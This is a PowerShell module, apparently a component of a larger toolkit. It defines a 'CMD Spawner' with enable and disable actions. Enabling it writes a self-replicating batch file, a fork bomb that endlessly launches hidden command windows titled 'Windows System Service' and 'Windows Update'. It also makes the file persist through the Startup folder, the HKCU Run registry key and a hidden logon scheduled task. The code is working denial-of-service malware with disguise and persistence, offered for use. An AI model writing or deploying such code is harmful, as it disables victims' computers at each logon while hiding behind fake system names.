$CmdSpawner = @{
    Name = "CMD Spawner"
    Width = 360
    Height = 80
    Actions = @{
        Enable = {
            try {
                # Create the base spawner batch file
                $spawnScript = @'
@echo off
timeout /t 30 /nobreak > nul
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
:spawn
start /min cmd /c "cd %userprofile%\Desktop && title Windows System Service && %~dpnx0"
start /min cmd /c "cd %userprofile%\Desktop && title Windows Update && %~dpnx0"
goto spawn
'@
                # Create persistence directories
                $scriptsPath = "$env:APPDATA\System"
                if (-not (Test-Path $scriptsPath)) {
                    New-Item -ItemType Directory -Path $scriptsPath -Force | Out-Null
                }

                # Save the spawner
                $spawnerPath = Join-Path $scriptsPath "service.bat"
                $spawnScript | Out-File $spawnerPath -Encoding ASCII -Force

                # Multiple persistence methods
                # 1. Startup Folder
                $startupPath = [Environment]::GetFolderPath('Startup')
                $startupScript = "@echo off`nstart /min `"$spawnerPath`""
                $startupScript | Out-File (Join-Path $startupPath "SystemService.bat") -Encoding ASCII -Force

                # 2. Registry Run
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                Set-ItemProperty -Path $regPath -Name "SystemService" -Value "cmd /c start /min `"$spawnerPath`"" -Force

                # 3. Scheduled Task
                $taskName = "SystemServiceManager"
                $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c start /min `"$spawnerPath`""
                $trigger = New-ScheduledTaskTrigger -AtLogon
                $settings = New-ScheduledTaskSettingsSet -Hidden
                Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force

                # Start the spawner
                Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /min `"$spawnerPath`"" -WindowStyle Hidden
                
                Write-Host "CMD spawner activated with multi-boot persistence"
                return $true
            }
            catch {
                Write-Host "Error starting CMD spawner: $_"
                return $false
            }
        }
        Disable = {
            try {
                # Kill all CMD processes
                Get-Process | Where-Object { 
                    $_.ProcessName -eq "cmd" -and 
                    ($_.MainWindowTitle -match "Windows System Service" -or 
                     $_.MainWindowTitle -match "Windows Update")
                } | Stop-Process -Force -ErrorAction SilentlyContinue

                # Clean up startup entries
                $startupPath = [Environment]::GetFolderPath('Startup')
                Remove-Item (Join-Path $startupPath "SystemService.bat") -Force -ErrorAction SilentlyContinue

                # Clean up registry
                $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
                Remove-ItemProperty -Path $regPath -Name "SystemService" -ErrorAction SilentlyContinue

                # Remove scheduled task
                Unregister-ScheduledTask -TaskName "SystemServiceManager" -Confirm:$false -ErrorAction SilentlyContinue

                # Remove scripts
                $scriptsPath = "$env:APPDATA\System"
                if (Test-Path $scriptsPath) {
                    Remove-Item -Path $scriptsPath -Recurse -Force
                }

                Write-Host "CMD spawner deactivated"
                return $true
            }
            catch {
                Write-Host "Error stopping CMD spawner: $_"
                return $false
            }
        }
    }
}

return $CmdSpawner